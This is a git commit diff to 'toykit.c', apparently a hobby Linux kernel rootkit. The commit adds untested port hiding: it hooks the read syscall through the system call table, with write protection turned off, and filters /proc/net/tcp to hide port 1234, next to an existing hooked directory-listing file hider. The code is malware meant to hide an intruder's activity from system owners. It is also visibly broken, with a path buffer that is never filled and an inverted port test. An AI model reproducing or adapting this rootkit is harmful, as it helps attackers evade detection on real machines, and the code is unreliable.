c798a2710a6d715e7d72d8764928c7d3a819a57d
Josh Imhoff <joshimhoff13@gmail.com>
2013-05-05 23:24:28 -0400

    Adds untested port hiding implementation

--- toykit.c
+++ toykit.c
@@ -10,6 +10,37 @@
 #include <linux/dirent.h>
 #include <linux/string.h>
 
+#include <linux/errno.h>
+#include <linux/time.h>
+#include <linux/proc_fs.h>
+#include <linux/stat.h>
+#include <linux/task_io_accounting_ops.h>
+#include <linux/capability.h>
+#include <linux/file.h>
+#include <linux/fdtable.h>
+#include <linux/seq_file.h>
+#include <linux/namei.h>
+#include <linux/mnt_namespace.h>
+#include <linux/mm.h>
+#include <linux/swap.h>
+#include <linux/rcupdate.h>
+#include <linux/kallsyms.h>
+#include <linux/stacktrace.h>
+#include <linux/resource.h>
+#include <linux/mount.h>
+#include <linux/security.h>
+#include <linux/ptrace.h>
+#include <linux/tracehook.h>
+#include <linux/cgroup.h>
+#include <linux/cpuset.h>
+#include <linux/audit.h>
+#include <linux/poll.h>
+#include <linux/nsproxy.h>
+#include <linux/oom.h>
+#include <linux/elf.h>
+#include <linux/pid_namespace.h>
+#include <linux/fs_struct.h>
+
 // TODO 
 // Hide ports
 // Cite sources
@@ -23,6 +54,9 @@
 
 // for controlling the file hider
 #define HIDE_SIG 16
+
+// for port hiding
+#define HIDE_PORT "1234"
 
 // for writing to sys_call_table
 #define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
@@ -183,6 +217,48 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	return result;
 }
 
+int getPathnameFromFD(int fd, char *pathname)
+{
+	char *tmp;
+	struct file *file;
+	struct files_struct *files = NULL;
+	struct path path;
+	
+	files = get_files_struct(current);
+	put_task_struct(current);
+
+	spin_lock(&files->file_lock);
+	file = fcheck_files(files, fd);
+	if (!file) {
+	    spin_unlock(&files->file_lock);
+	    return -ENOENT;
+	}
+
+	path = file->f_path;
+	path_get(&file->f_path);
+	spin_unlock(&files->file_lock);
+
+	tmp = (char *)__get_free_page(GFP_TEMPORARY);
+
+	if (!tmp) {
+	    path_put(&path);
+	    return -ENOMEM;
+	}
+
+	pathname = d_path(&path, tmp, PAGE_SIZE);
+	path_put(&path);
+
+	if (IS_ERR(pathname)) {
+	    free_page((unsigned long)tmp);
+	    return PTR_ERR(pathname);
+	}
+
+	/* do something here with pathname */
+
+	free_page((unsigned long)tmp);
+	return 0;
+}
+
 typedef asmlinkage long (*read_ptr)(unsigned int fd, char __user *buf,
                                     size_t count);
 read_ptr orig_read;
@@ -190,28 +266,45 @@ read_ptr orig_read;
 asmlinkage long hacked_read(unsigned int fd, char __user *buf,
                            size_t count)
 {
-	long result;
-	char *kbuf;
+	long result, bp, diff_in_bytes;
+	char *start_line, *end_line, *port_num;
+	char pathname[256];
 
 	// run real read 
 	result = (*orig_read)(fd,buf,count);
 
 	// copy from user to kernelspace;
-	if (!access_ok(VERIFY_READ,buf,result))
-		return -1;
-	if ((kbuf = kmalloc(result,GFP_KERNEL)) == NULL)
-		return -1;
-	if (copy_from_user(kbuf,buf,result))
-		return -1;
+	//if (!access_ok(VERIFY_READ,buf,result))
+	//	return -1;
+	//if ((kbuf = kmalloc(result,GFP_KERNEL)) == NULL)
+	//	return -1;
+	//if (copy_from_user(kbuf,buf,result))
+	//	return -1;
 
 	// filter out hidden ports if reading /proc/net/tcp
+	if (getPathnameFromFD(fd,pathname))
+		return -1;
+	if (!strcmp(pathname,"/proc/net/tcp")) {
+		for (bp = 0; bp < result;) {
+			start_line = buf + bp;
+			port_num = strchr(strchr(start_line,':') + 1,':') + 1;
+			end_line = strchr(start_line,'\n');
+			diff_in_bytes = ((end_line + 1) - start_line) * sizeof(char);
+			if (strncmp(port_num,HIDE_PORT,4)) {
+				memmove(start_line,end_line + 1,
+					result - bp - diff_in_bytes);
+				result -= diff_in_bytes;
+			}
+			bp += diff_in_bytes;
+		}
+	}
 
 	// copy from kernel to userspace
-	if (!access_ok(VERIFY_WRITE,buf,result))
-		return -1;
-	if (copy_to_user(buf,kbuf,result))
-		return -1;
-	kfree(kbuf);
+	//if (!access_ok(VERIFY_WRITE,buf,result))
+	//	return -1;
+	//if (copy_to_user(buf,kbuf,result))
+	//	return -1;
+	//kfree(kbuf);
 
 	// return number of bytes read
 	return result;
